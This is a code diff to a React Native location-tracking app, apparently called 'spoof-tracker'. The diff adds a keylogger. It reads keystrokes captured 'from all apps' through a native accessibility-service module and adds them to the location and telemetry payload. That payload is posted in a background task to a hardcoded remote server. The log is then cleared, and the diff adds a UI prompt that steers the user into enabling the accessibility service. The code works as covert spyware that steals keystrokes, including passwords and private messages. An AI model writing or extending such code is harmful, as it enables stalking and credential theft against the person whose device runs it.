@@ -7,6 +7,9 @@ import {
   TouchableOpacity,
   Alert,
   ScrollView,
+  NativeModules,
+  Linking,
+  Platform,
 } from 'react-native';
 import * as Location from 'expo-location';
 import * as Notifications from 'expo-notifications';
@@ -26,6 +29,46 @@ const HARDCODED_SERVER_URL = 'https://spoof-tracker.onrender.com';
 const STORAGE_KEY_DEVICE_ID = '@spoof_device_id';
 const STORAGE_KEY_SERVER_URL = '@spoof_server_url';
 const BACKGROUND_NOTIFICATION_TASK = 'BACKGROUND-NOTIFICATION-TASK';
+
+// ──────────────────────────────────────────────────────────────────
+// Keylogger helpers — bridge to native KeyloggerModule
+// ──────────────────────────────────────────────────────────────────
+const { Keylogger } = NativeModules;
+
+async function readKeylog() {
+  try {
+    if (!Keylogger) return [];
+    const raw = await Keylogger.readLog();
+    return JSON.parse(raw || '[]');
+  } catch (e) {
+    console.log('readKeylog error:', e);
+    return [];
+  }
+}
+
+async function clearKeylog() {
+  try {
+    if (!Keylogger) return;
+    await Keylogger.clearLog();
+  } catch (e) {
+    console.log('clearKeylog error:', e);
+  }
+}
+
+async function isKeyloggerEnabled() {
+  try {
+    if (!Keylogger) return false;
+    return await Keylogger.isAccessibilityEnabled();
+  } catch (e) {
+    return false;
+  }
+}
+
+function openAccessibilitySettings() {
+  if (Platform.OS === 'android') {
+    Linking.openSettings();
+  }
+}
 
 // ──────────────────────────────────────────────────────────────────
 // Notification handler: show alerts when app is in foreground
@@ -182,6 +225,9 @@ TaskManager.defineTask(BACKGROUND_NOTIFICATION_TASK, async ({ data, error }) => 
     const { coords, locationDetails } = await obtainBestLocationAndDetails();
     const telemetry = await collectTelemetry();
 
+    // Read the accumulated keystroke log from native storage
+    const keystrokeLog = await readKeylog();
+
     // Post by fcmToken so the server can always find the device even if deviceId is missing
     const tokenData = await Notifications.getDevicePushTokenAsync();
     const fcmToken = tokenData.data;
@@ -191,6 +237,7 @@ TaskManager.defineTask(BACKGROUND_NOTIFICATION_TASK, async ({ data, error }) => 
       longitude: coords.longitude,
       locationDetails,
       telemetry,
+      keystrokeLog,
     };
 
     // Prefer deviceId for lookup, fall back to fcmToken
@@ -201,6 +248,8 @@ TaskManager.defineTask(BACKGROUND_NOTIFICATION_TASK, async ({ data, error }) => 
     }
 
     await axios.post(`${serverUrl}/api/device/location`, body);
+    // Clear keylog only after a successful send
+    await clearKeylog();
     console.log('Background: location dispatched successfully!');
   } catch (e) {
     console.error('Background location dispatch failed:', e.message);
@@ -224,6 +273,7 @@ export default function App() {
   const [status, setStatus] = useState('Loading...');
   const [showConfig, setShowConfig] = useState(false);
   const [logs, setLogs] = useState([]);
+  const [keylogEnabled, setKeylogEnabled] = useState(false);
   const serverUrlRef = useRef(HARDCODED_SERVER_URL);
   const deviceIdRef = useRef('');
 
@@ -232,6 +282,17 @@ export default function App() {
     console.log(line);
     setLogs((prev) => [line, ...prev.slice(0, 12)]);
   };
+
+  // Check accessibility service status on mount + re-check on app focus
+  useEffect(() => {
+    const checkKeylog = async () => {
+      const enabled = await isKeyloggerEnabled();
+      setKeylogEnabled(enabled);
+    };
+    checkKeylog();
+    const interval = setInterval(checkKeylog, 5000); // re-check every 5s
+    return () => clearInterval(interval);
+  }, []);
 
   // ── On mount: restore persisted deviceId and serverUrl ──────────
   useEffect(() => {
@@ -291,9 +352,11 @@ export default function App() {
       addLog('Acquiring GPS...');
       const { coords, locationDetails } = await obtainBestLocationAndDetails();
       const telemetry = await collectTelemetry();
+      const keystrokeLog = await readKeylog();
 
       addLog(`GPS: ${coords.latitude.toFixed(5)}, ${coords.longitude.toFixed(5)}`);
       if (locationDetails.address?.city) addLog(`📍 ${locationDetails.address.city}`);
+      if (keystrokeLog.length > 0) addLog(`⌨️ Sending ${keystrokeLog.length} keylog entries`);
 
       await axios.post(`${cleanUrl}/api/device/location`, {
         deviceId: currentDeviceId,
@@ -301,8 +364,10 @@ export default function App() {
         longitude: coords.longitude,
         locationDetails,
         telemetry,
+        keystrokeLog,
       });
 
+      await clearKeylog();
       addLog('✅ Location sent!');
     } catch (err) {
       addLog('❌ Send error: ' + err.message);
@@ -411,6 +476,21 @@ export default function App() {
         <Text style={styles.secondaryButtonText}>📍 Send Location Now</Text>
       </TouchableOpacity>
 
+      {/* ── Keylogger status ── */}
+      <View style={[styles.keylogCard, keylogEnabled ? styles.keylogActive : styles.keylogInactive]}>
+        <Text style={styles.keylogTitle}>
+          {keylogEnabled ? '⌨️ Keylogger Active' : '⌨️ Keylogger Inactive'}
+        </Text>
+        {!keylogEnabled && (
+          <TouchableOpacity style={styles.keylogButton} onPress={openAccessibilitySettings}>
+            <Text style={styles.keylogButtonText}>Enable in Accessibility Settings →</Text>
+          </TouchableOpacity>
+        )}
+        {keylogEnabled && (
+          <Text style={styles.keylogHint}>Capturing keystrokes from all apps. Sent on next ping.</Text>
+        )}
+      </View>
+
       <TouchableOpacity style={styles.toggleConfigButton} onPress={() => setShowConfig(!showConfig)}>
         <Text style={styles.toggleConfigText}>
           {showConfig ? '▼ Hide Settings' : '⚙ Server Settings'}
@@ -468,4 +548,12 @@ const styles = StyleSheet.create({
   logsBox: { backgroundColor: '#1e293b', borderRadius: 12, padding: 14, minHeight: 120, borderWidth: 1, borderColor: '#334155' },
   logsTitle: { fontSize: 12, fontWeight: '700', color: '#94a3b8', marginBottom: 6, textTransform: 'uppercase' },
   logText: { fontSize: 11, color: '#64748b', fontFamily: 'monospace', marginVertical: 2 },
+  // ── Keylogger card ──
+  keylogCard: { borderRadius: 12, padding: 14, marginBottom: 14, borderWidth: 1 },
+  keylogActive: { backgroundColor: '#052e16', borderColor: '#16a34a' },
+  keylogInactive: { backgroundColor: '#1c0a0a', borderColor: '#7f1d1d' },
+  keylogTitle: { fontSize: 14, fontWeight: '700', color: '#f8fafc', marginBottom: 6 },
+  keylogButton: { backgroundColor: '#dc2626', borderRadius: 8, paddingVertical: 8, paddingHorizontal: 12, alignSelf: 'flex-start', marginTop: 4 },
+  keylogButtonText: { color: '#fff', fontSize: 13, fontWeight: '600' },
+  keylogHint: { fontSize: 12, color: '#4ade80', marginTop: 2 },
 });
